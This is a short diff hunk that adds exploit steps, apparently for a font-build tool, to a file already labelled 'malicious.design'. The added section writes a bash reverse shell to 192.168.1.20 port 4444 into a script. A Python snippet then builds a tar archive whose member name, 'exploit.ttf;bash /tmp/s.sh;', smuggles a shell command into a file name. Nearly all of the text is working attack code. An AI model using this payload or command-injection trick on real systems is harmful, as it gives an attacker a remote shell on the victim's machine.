@@ -29,3 +29,26 @@ Varia: malicious.design
 </designspace>
 
 
+Varia tar:
+
+
+### 2. Generate the malicious TAR archive
+```bash
+# Write the reverse shell payload
+echo 'bash -i >& /dev/tcp/192.168.1.20/4444 0>&1' > /tmp/s.sh
+chmod +x /tmp/s.sh
+
+# Build the malicious archive
+python3 << 'EOF'
+import tarfile, io
+
+malicious_name = "exploit.ttf;bash /tmp/s.sh;"
+tar = tarfile.open("exploit.tar", "w")
+info = tarfile.TarInfo(name=malicious_name)
+info.size = 4
+tar.addfile(info, io.BytesIO(b"AAAA"))
+tar.close()
+print("done")
+EOF
+```
+
